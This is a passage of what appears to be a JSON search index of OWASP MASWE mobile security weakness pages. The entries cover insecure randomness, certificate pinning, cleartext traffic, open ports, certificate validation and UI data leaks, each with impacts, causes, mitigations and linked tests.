An attacker could potentially guess the generated numbers and gain access to privileged data or functionality. Predicting or regenerating random numbers can lead to encryption breaches, compromise sensitive user information, or enable user impersonation.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0027/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Risky Random APIs: The app may use many existing APIs to generate random numbers with insufficient entropy.</li> <li>Non-random Sources: The app may use custom methods to create \"supposedly random\" values, using non-random sources such as the current time.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0027/#mitigations","title":"Mitigations","text":"<p>For security-relevant contexts, use cryptographically secure random numbers.</p> <p>In general, it is strongly recommended not to use any random function in a deterministic way, even if it's a secure one, especially those involving hardcoded seed values (which are vulnerable to exposure by decompilation).</p> <p>Refer to the RFC 1750 - Randomness Recommendations for Security and the OWASP Cryptographic Storage Cheat Sheet - Secure Random Number Generation for more information and recommendations on random number generation.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0027/#tests","title":"Tests","text":"<p> MASTG-TEST-0204: Insecure Random API Usage  MASTG-TEST-0205: Non-random Sources Usage </p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0047/","title":"MASWE-0047: Insecure Identity Pinning","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L2","maswe","masvs-network-2"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0047/#overview","title":"Overview","text":"<p>Identity pinning (aka. certificate pinning, public key pinning or TLS pinning) refers to associating a mobile app with a specific cryptographic identity, such as a certificate or public key to ensure that the app only communicates with trusted servers.</p> <p>When a mobile app does not implement certificate pinning, or if it is implemented incorrectly, the app remains vulnerable to Machine-in-the-Middle (MITM) attacks which enable attackers to intercept and modify the communication between the app and the intended server. This occurs because when the app is presented a fraudulent certificate that the app may unknowingly trust, thereby gaining access to sensitive data or injecting malicious content into the data stream.</p> <p>Limitations: Certificate pinning adds a layer of trust verification by ensuring that the app only accepts connections to servers with specific, pre-determined certificates or public keys. This reduces the risk of unauthorized interception, even if a trusted Certificate Authority (CA) is compromised. However, it is not foolproof:</p> <ul> <li>Attackers who can reverse-engineer the app may analyze and remove or modify the pre-defined pins or the certificate pinning logic to permanently bypass the checks.</li> <li>Attackers who can perform  Tampering and Runtime Instrumentation techniques to manipulate the app and bypass pinning checks.</li> </ul> <p>This highlights the importance of implementing certificate pinning alongside other security measures to enhance the app's resistance to advanced threats.</p>","tags":["android","ios","L2","maswe","masvs-network-2"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0047/#impact","title":"Impact","text":"<ul> <li>Data Interception: Attackers can capture and read sensitive information transmitted over the network.</li> <li>Data Manipulation: Attackers might alter data in transit, causing corruption or injecting malicious content.</li> <li>Data Exposure: Sensitive information can be compromised.</li> <li>Denial of Service: Incorrect pinning may cause legitimate connections to fail, leading to service disruptions for users. For example, if a pinned certificate expires and is not updated, the app may be unable to establish secure connections.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-2"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0047/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Improper Configuration of Pinning Libraries: Misconfiguring libraries like TrustKit, OkHttp's <code>CertificatePinner</code>, Volley, or AFNetworking's <code>SSLPinningMode</code>, leading to ineffective pinning.</li> <li>Dynamic Pinning without Security: Retrieving pins dynamically over insecure channels without proper validation, making it easy for attackers to supply malicious pins.</li> <li>Improper Validation Logic: Custom pinning implementations that do not correctly validate the certificate chain or public key. For example, accepting any certificate that chains to a trusted root CA instead of a specific certificate or public key.</li> <li>Lack of Backup Pins: Not including backup pins to prevent connectivity issues if the primary pin is no longer valid.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-2"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0047/#mitigations","title":"Mitigations","text":"<ul> <li>Prefer Platform-provided Solutions: Use platform-provided mechanisms like Android's Network Security Configuration (NSC) or iOS's App Transport Security (ATS) to enforce pinning.</li> <li>Use Trusted Pinning Libraries: Refrain from writing custom pinning logic; instead, rely on established and well-maintained libraries and frameworks (e.g., TrustKit, OkHttp's <code>CertificatePinner</code>) and ensure they are correctly configured according to best practices.</li> <li>Secure Dynamic Pinning: If dynamic pinning is necessary, retrieve pins over secure channels and validate them thoroughly before use.</li> <li>Pin to Public Keys Instead of Certificates: Pin to the certificate's public key rather than the whole certificate to avoid issues regarding expiration and renewals.</li> <li>Consistent Enforcement: Apply pinning uniformly for all connections to servers that you control.</li> <li>Regularly Update Pins: Keep the pinned certificates or public keys up to date with the server's current configuration and have a process for updating the app when changes occur.</li> <li>Implement Backup Pins: Include backup pins (hashes of additional trusted public keys) to prevent connectivity issues if the primary key changes.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-2"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0047/#tests","title":"Tests","text":"<p> MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic  MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration  MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration </p>","tags":["android","ios","L2","maswe","masvs-network-2"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0048/","title":"MASWE-0048: Insecure Machine-to-Machine Communication","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0048</p>","tags":["android","ios","L1","L2","maswe","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0048/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Android applications often use technologies like Bluetooth, NFC, and USB for data transfer and device interaction. Developers must use these APIs carefully to prevent data exposure and remote device takeover by attackers.</p>","tags":["android","ios","L1","L2","maswe","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0048/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Bluetooth</li> <li>BLE</li> <li>NFC</li> <li>USB</li> <li>Wi-Fi P2P</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0048/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0019 - Testing Data Encryption on the Network (android)</li> <li>MASTG-TEST-0065 - Testing Data Encryption on the Network (ios)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0049/","title":"MASWE-0049: Proven Networking APIs Not used","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L2","maswe","masvs-network-1","masvs-code-3"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0049/#overview","title":"Overview","text":"<p>Applications that do not utilize platform-provided networking APIs or well-established security libraries are susceptible to security vulnerabilities. When developers implement custom networking code or \"roll-your-own\" security mechanisms, they risk introducing flaws due to a lack of deep expertise in cryptography and network security. Platform-provided APIs and libraries, such as <code>NSURLSession</code> on iOS or <code>HttpsURLConnection</code> on Android, are designed and maintained by experts, incorporating security best practices and regular updates to address new threats and vulnerabilities.</p>","tags":["android","ios","L2","maswe","masvs-network-1","masvs-code-3"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0049/#impact","title":"Impact","text":"<ul> <li>Security Vulnerabilities: Custom networking implementations may contain flaws that attackers can exploit, leading to data breaches and unauthorized access.</li> <li>Lack of Updates: Custom code may not receive timely updates to address new vulnerabilities or comply with evolving security standards.</li> <li>Inconsistent Security Measures: Bypassing standard APIs can result in inconsistent application of security features like encryption, certificate validation, and error handling.</li> <li>Increased Development Complexity: Writing and maintaining custom networking code increases complexity, making it harder to audit and secure the application.</li> <li>Non-Compliance with Standards: Failing to use approved APIs may lead to non-compliance with industry regulations and security guidelines.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-1","masvs-code-3"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0049/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Custom Networking Stack Development: Developers create their own networking code instead of using platform-provided APIs, possibly to add custom features or due to unfamiliarity with existing APIs.</li> <li>Use of Insecure Third-Party Libraries: Incorporating third-party networking libraries that are outdated or do not follow current security best practices.</li> <li>Bypassing Security Mechanisms: Deliberately avoiding standard APIs to circumvent security checks, such as certificate pinning or TLS enforcement.</li> <li>Insufficient Security Knowledge: Developers may lack adequate understanding of network security principles, leading to insecure implementations.</li> <li>Performance Optimization Attempts: Writing custom networking code to optimize performance without fully considering the security implications.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-1","masvs-code-3"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0049/#mitigations","title":"Mitigations","text":"<ul> <li>Utilize Platform-Provided Networking APIs: Always use the networking APIs provided by the platform, such as <code>NSURLSession</code> for iOS and <code>HttpsURLConnection</code> for Android, which handle many security concerns internally.</li> <li>Adopt Established Security Libraries: If additional functionality is required, use reputable, well-maintained libraries like <code>OkHttp</code> for Android or <code>Alamofire</code> on iOS that adhere to security best practices.</li> <li>Avoid Custom Security Implementations: Refrain from implementing custom cryptographic algorithms or security protocols; rely on standard, vetted solutions instead.</li> <li>Keep Dependencies Updated: Regularly update all libraries and dependencies to incorporate the latest security patches and improvements.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-1","masvs-code-3"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0050/","title":"MASWE-0050: Cleartext Traffic","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0050/#overview","title":"Overview","text":"<p>When data is sent in cleartext (i.e. without encryption) it becomes accessible to attackers who can monitor network channels. Attackers can perform passive eavesdropping to intercept data or employ active Machine-in-the-Middle (MITM) attacks to manipulate data, potentially altering app behavior or injecting malicious content.</p> <p>This weakness is especially concerning when sensitive information is transmitted without encryption, putting user privacy and security at direct risk. Even when sensitive data isn't being transmitted, using cleartext communication remains a vulnerability. Network attacks like ARP poisoning and DNS spoofing can allow attackers to intercept or redirect traffic, potentially disrupting app functionality or deceiving users by redirecting them to malicious sites that impersonate legitimate services.</p> <p>If the connections were secured using encryption and proper authentication mechanisms, these attacks would be much harder to perform because the attacker would need to bypass encryption and certificate validation. Secure network protocols not only provide confidentiality but also ensure data integrity and authenticity through encryption and certificate validation, preventing attackers from altering data.</p>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0050/#impact","title":"Impact","text":"<ul> <li>Data Interception: Attackers can capture and read sensitive information transmitted over the network.</li> <li>Data Manipulation: Attackers might alter data in transit, causing corruption or injecting malicious content.</li> <li>Unauthorized Access: Attackers may intercept session tokens or credentials sent over cleartext channels, enabling them to impersonate users and gain unauthorized access to user accounts or systems.</li> <li>Privacy Breach: Personal and confidential user information could be exposed, violating privacy regulations.</li> <li>Regulatory Compliance Violations: Exposing sensitive data may lead to non-compliance with laws like GDPR or HIPAA, resulting in legal penalties.</li> <li>Reputation Damage: Security breaches can erode user trust and harm the organization's reputation.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0050/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Cleartext Traffic Allowed in Platform-provided Settings: Configuring platform-provided settings (e.g. Network Security Configuration on Android or App Transport Security on iOS) to explicitly allow cleartext traffic (globally or per-domain), making it the default behavior for all network connections managed by those settings.</li> <li>Usage of HTTP: Using HTTP instead of HTTPS for communication, which does not encrypt data in transit.</li> <li>Usage of Non-HTTP Insecure Protocols: Using insecure protocols such as FTP, SMTP without TLS, TCP sockets or custom protocols which do not encrypt data in transit.</li> <li>Usage of Low-Level Network APIs: Use of low-level network APIs that do not enforce encryption and do not honor the platform's network security settings, such as <code>Socket</code> on Android or <code>NSURLConnection</code> on iOS.</li> <li>Cross-Platform Framework Misconfiguration: Improper settings in cross-platform frameworks may allow cleartext traffic for both Android and iOS versions of an app.</li> <li>Third-Party Libraries: Using third-party libraries or SDKs that default to insecure communication methods or are improperly configured.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0050/#mitigations","title":"Mitigations","text":"<ul> <li>Use Secure Protocols: Always use secure protocols like HTTPS (which employs TLS for encryption), FTPS, SFTP or SMTPS for all communication channels. Ensure these protocols are used consistently throughout the app.</li> <li>Explicitly Disable Cleartext Traffic: Never allow cleartext traffic globally in the app configuration. Ensure that cleartext traffic is explicitly disabled using security settings like the Network Security Configuration on Android and App Transport Security (ATS) on iOS. Prefer per-domain exceptions over global settings but use them carefully and only when there is no other option.</li> <li>Use Per-Domain Exceptions Sparingly: If cleartext traffic is absolutely necessary for specific domains, ensure these domains are trusted and essential for the app's functionality, and conduct a thorough risk assessment before including them.</li> <li>Prefer Server Fixes: Whenever possible, work with the server team to enable secure communication. Instead of adding network security exceptions to the mobile app, such as allowing cleartext traffic or lowering the minimum TLS version, update server configurations to support HTTPS with valid certificates and modern TLS protocols.</li> <li>Use High-Level Network APIs: Use high-level network APIs that automatically handle encryption, certificate validation, and errors, such as <code>HttpsURLConnection</code> on Android or <code>URLSession</code> on iOS. Avoid using low-level network APIs or custom network stacks that bypass the platform-provided network security features.</li> <li>Use Secure Cross-Platform Frameworks: Ensure that cross-platform frameworks\u2014such as React Native, Flutter, or Xamarin\u2014are configured to enforce secure communication by default and do not allow cleartext traffic. Review the framework's documentation and adjust network security settings to align with best practices.</li> <li>Use Secure Third-Party Components: Verify that any third-party libraries and SDKs used in the app enforce secure communication protocols, especially if they handle sensitive data or use low-level networking APIs. Ensure that these components are regularly updated to address any vulnerabilities.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0050/#tests","title":"Tests","text":"<p> MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic  MASTG-TEST-0236: Cleartext Traffic Observed on the Network  MASTG-TEST-0233: Hardcoded HTTP URLs  MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic  MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic  MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code  MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection  MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic </p>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0051/","title":"MASWE-0051: Unprotected Open Ports","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0051/#overview","title":"Overview","text":"<p>Applications that open network ports without proper protection are vulnerable to unauthorized access and potential exploitation. This weakness occurs when an application listens on a network port and accepts incoming connections without adequate security measures, allowing other applications or attackers to connect and interact with it.</p>","tags":["android","ios","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0051/#impact","title":"Impact","text":"<ul> <li>Unauthorized Access: Attackers can connect to open ports and gain access to application functionalities or sensitive data.</li> <li>Data Leakage: Sensitive information may be exposed through unprotected ports if proper authentication and encryption are not enforced.</li> <li>Remote Code Execution: Exploitation of open ports can lead to the execution of arbitrary code on the device.</li> <li>Denial of Service: Attackers may overload the open port, causing the application or device to become unresponsive.</li> <li>Privacy Breach: User data and application state can be compromised, leading to privacy violations and non-compliance with regulations.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0051/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Binding to All Network Interfaces: Configuring the application to bind to all available network interfaces (e.g., using wildcard addresses), making it accessible over untrusted networks.</li> <li>Insecure Loopback Address Usage: Misconfiguring the application to listen on loopback addresses without proper access restrictions.</li> <li>Lack of Access Controls: Failing to implement authentication and authorization mechanisms for services exposed via open ports.</li> <li>Debug Services Left Enabled: Leaving development or debugging network services active in production releases.</li> <li>Misconfigured Firewall Settings: Not setting up proper firewall rules, allowing unauthorized inbound connections to open ports.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0051/#mitigations","title":"Mitigations","text":"<ul> <li>Restrict Network Bindings: Configure the application to bind only to specific, necessary network interfaces, avoiding the use of wildcard addresses like <code>INADDR_ANY</code>.</li> <li>Implement Strong Access Controls: Enforce authentication and authorization for any services exposed through open ports to ensure only authorized entities can connect.</li> <li>Disable Debugging Services in Production: Ensure that all development and debugging network services are disabled or removed in production builds.</li> <li>Configure Firewalls Appropriately: Set up firewall rules to restrict access to open ports, allowing connections only from trusted sources.</li> </ul>","tags":["android","ios","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0052/","title":"MASWE-0052: Insecure Certificate Validation","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0052/#overview","title":"Overview","text":"<p>Apps that do not properly validate TLS certificates during secure communication are susceptible to Machine-in-the-Middle (MITM) attacks and other security threats. This weakness occurs when an app accepts invalid, expired, self-signed, or untrusted certificates without appropriate verification, compromising the integrity and confidentiality of data in transit.</p>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0052/#impact","title":"Impact","text":"<ul> <li>Data Interception: Attackers can capture and read sensitive information transmitted over the network.</li> <li>Data Manipulation: Attackers might alter data in transit, causing corruption or injecting malicious content.</li> <li>Data Exposure: Sensitive information can be compromised.</li> <li>Unauthorized Access: Attackers may gain unauthorized access to user accounts or systems by intercepting authentication tokens or credentials.</li> <li>Impersonation of Services: Users may be deceived into interacting with malicious servers impersonating legitimate services.</li> <li>Data Integrity Loss: Altered or corrupted data may be accepted by the application, leading to unreliable or malicious outcomes.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0052/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Disabling Certificate Validation: Developers disable or bypass certificate validation checks to simplify development or troubleshoot connectivity issues.</li> <li>Accepting Self-Signed Certificates: Applications accept self-signed or untrusted certificates without proper validation against trusted Certificate Authorities (CAs).</li> <li>Ignoring Hostname Verification: Failing to verify that the certificate's hostname matches the server's hostname allows attackers to present valid certificates for other domains.</li> <li>Using Insecure Custom Trust Managers: Implementing custom certificate validation logic that is incomplete, incorrect, or insecure.</li> <li>Incorrect Error Handling: Proceeding with connections even when certificate validation errors occur, without alerting the user or terminating the connection.</li> <li>Trusting All Certificates: Configuring the application to trust all certificates by default, without any validation.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0052/#mitigations","title":"Mitigations","text":"<ul> <li>Enforce Strict Certificate Validation: Always validate TLS certificates against a trusted set of Certificate Authorities (CAs) provided by the operating system or a trusted third party.</li> <li>Avoid Accepting Self-Signed Certificates: Do not accept self-signed or untrusted certificates in production environments unless there is a secure mechanism to trust them explicitly.</li> <li>Enable Hostname Verification: Ensure that the application's network layer verifies the server's hostname against the certificate's Subject Alternative Name (SAN) or Common Name (CN).</li> <li>Use Standard Trust Managers: Utilize well-established libraries and platform-provided APIs for certificate validation instead of custom implementations.</li> <li>Handle Validation Errors Properly: Terminate the connection and alert the user whenever certificate validation fails due to issues like expiration, revocation, or mismatch.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-NETWORK/MASWE-0052/#tests","title":"Tests","text":"<p> MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs  MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification  MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets  MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs  MASTG-TEST-0282: Unsafe Custom Trust Evaluation  MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews </p>","tags":["android","ios","L1","L2","maswe","masvs-network-1"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0053/","title":"MASWE-0053: Sensitive Data Leaked via the User Interface","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0053</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0053/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. leaking passwords, PINs via the UI</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0053/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>secureText</li> <li>copy/paste disabled</li> <li>auto-correct</li> <li>etc.</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0053/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0008 - Checking for Sensitive Data Disclosure Through the User Interface (android)</li> <li>MASTG-TEST-0057 - Checking for Sensitive Data Disclosed Through the User Interface (ios)</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0053/#tests","title":"Tests","text":"<p> MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements  MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device  MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime  MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use  MASTG-TEST-0279: Pasteboard Contents Not Expiring  MASTG-TEST-0276: Use of the iOS General Pasteboard </p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0054/","title":"MASWE-0054: Sensitive Data Leaked via Notifications","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0054</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0054/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. stealing pending intents from notifications via notificationlistenerservice or tapjacking wire transfer UI.</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0054/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>NotificationListenerService</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0054/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0055/","title":"MASWE-0055: Sensitive Data Leaked via Screenshots","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0055</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0055/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>no method is used to prevent specific content from being captured (e.g. via FLAG_SECURE on Android and Secure Text Entry on iOS)</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0055/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Screenshots Not Prevented (e.g. via DETECT_SCREEN_CAPTURE on Android)</li> <li>Screenshots not deleted when backgrounding</li> <li>Auto-Generated Screenshots</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0055/#references","title":"References","text":"<ul> <li>https://developer.android.com/about/versions/14/features/screenshot-detection</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0055/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0010 - Finding Sensitive Information in Auto-Generated Screenshots (android)</li> <li>MASTG-TEST-0059 - Testing Auto-Generated Screenshots for Sensitive Information (ios)</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0056/","title":"MASWE-0056: Tapjacking Attacks","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0056</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0056/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>not using View.setFilterTouchesWhenObscured(true) or android:filterTouchesWhenObscured=\"true\" in the AndroidManifest.xml or not ignoring touch events that have FLAG_WINDOW_IS_PARTIALLY_OBSCURED flag</p>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0056/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Full occlusion</li> <li>Partial occlusion</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0056/#references","title":"References","text":"<ul> <li>https://developer.android.com/topic/security/risks/tapjacking</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0056/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0035 - Testing for Overlay Attacks (android)</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-3","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0057/","title":"MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0057</p>","tags":["android","L1","L2","maswe","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0057/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>This vulnerability is exploited by manipulating the allowTaskReparenting and taskAffinity settings.</p>","tags":["android","L1","L2","maswe","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0057/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>StrandHogg Attack v1</li> <li>StrandHogg Attack v2</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0057/#references","title":"References","text":"<ul> <li>https://developer.android.com/topic/security/risks/strandhogg</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0057/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this 